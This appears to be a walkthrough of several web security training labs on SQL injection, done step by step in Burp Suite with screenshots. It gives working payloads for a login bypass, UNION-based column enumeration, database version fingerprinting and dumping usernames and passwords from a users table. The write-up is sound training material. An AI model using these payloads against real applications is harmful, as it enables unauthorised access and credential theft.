**Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**

<img src="images/image1.png" alt="third" width="500">

**Step1**

Go to any of the tab.

<img src="images/image2.png" alt="third" width="500">

**Step2**

In burpuite the request look like

<img src="images/image3.png" alt="third" width="500">

**Step3**

Send it to repeater and make the following change.

Add payload

`'+OR+1=1--`

<img src="images/image4.png" alt="third" width="700">

Now we have more product released in  the responses

<img src="images/image5.png" alt="third" width="500">

**Step1**

To solve this lab we will login with

`Username:administrator'--`

`Password:anything`

<img src="images/image_unmap1.png" alt="third" width="700">

**Step1:**

Click on any product item

**Step2:**

Send the Request to repeater

<img src="images/image_unmap2.png" alt="third" width="700">

**Step3:**

now we find the number of Column 

Try `'+UNION+SELECT+'a'+FROM+dual--` 

<img src="images/image_unmap3.png" alt="third" width="700">

The result show it that the number of column are more than 1

Try `'+UNION+SELECT+'a','b'+FROM+dual--`

<img src="images/image_unmap4.png" alt="third" width="700">

The result show OK which mean the number of column are two.


**Step4:**

To find database type and version we use `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

<img src="images/image_unmap5.png" alt="third" width="700">

In the result we can see database type and version.

and lab is solved

<img src="images/image7.png" alt="third" width="500">

**As we know there are two method**

 Two effective methods to determine how many columns are being returned from the original query.

**Method1**
```
' ORDER BY 1--

' ORDER BY 2--

' ORDER BY 3--
```

When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:

The ORDER BY position number 3 is out of range of the number of items in the select list.

**Method2**
```
' UNION SELECT NULL--

' UNION SELECT NULL,NULL--

' UNION SELECT NULL,NULL,NULL--
```

If the number of nulls does not match the number of columns, the database returns an error, such as:

All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

**Step1**

Click on any product categories

**Step2**

The request look like

<img src="images/image8.png" alt="third" width="500">

Send the request to repeater

**Step3**

Using this payload

`' UNION SELECT NULL-- `

<img src="images/image9.png" alt="third" width="500">

As we see internal server error

Now we try

`' UNION SELECT NULL,NULL--`

<img src="images/image10.png" alt="third" width="700">

Still error

Now we add one more column

`' UNION SELECT NULL,NULL,NULL--`

<img src="images/image11.png" alt="third" width="700">

And the Lab is solved.

<img src="images/image12.png" alt="third" width="700">

**For returning a column with useful data type we have**
```
' UNION SELECT 'a',NULL,NULL,NULL--

' UNION SELECT NULL,'a',NULL,NULL--

' UNION SELECT NULL,NULL,'a',NULL--

' UNION SELECT NULL,NULL,NULL,'a'--
```

Incase of error message look like

Conversion failed when converting the varchar value 'a' to data type int.

**Step1**

Click on any product categories

<img src="images/image13.png" alt="third" width="500">

**Step2**
Sending this request to repeater.

<img src="images/image14.png" alt="third" width="500">

**Step3:**

Checking number of column .first we use this

`'UNION SELECT NULL,NULL--`

Url encoded by pressing `ctrl+u` in burp

<img src="images/image15.png" alt="third" width="500">


Error show there are not two column

Try using `'UNION SELECT NULL,NULL,NULL--`

<img src="images/image16.png" alt="third" width="700">

The result show there are three column.

**Step4**

Now we check which one column allow sting method

Trying `'UNION SELECT 'A',NULL,NULL--`

<img src="images/image17.png" alt="third" width="700">

As the error message show first column not allow string

Trying `'UNION SELECT NULL,'A',NULL--`

<img src="images/image18.png" alt="third" width="700">

And we found the column

<img src="images/image19.png" alt="third" width="700">

**Step 1**

In this we check number of column as done above

<img src="images/image20.png" alt="third" width="500">

**Step2**

Check in which we can insert the string as done in previous lab

<img src="images/image21.png" alt="third" width="500">

**Step3**

As we know table name and column name so we use this query

`' UNION SELECT username, password FROM users--`

<img src="images/image22.png" alt="third" width="700">

Now we see password in response

<img src="images/image23.png" alt="third" width="700">

Now login with this credential. And lab will be solved
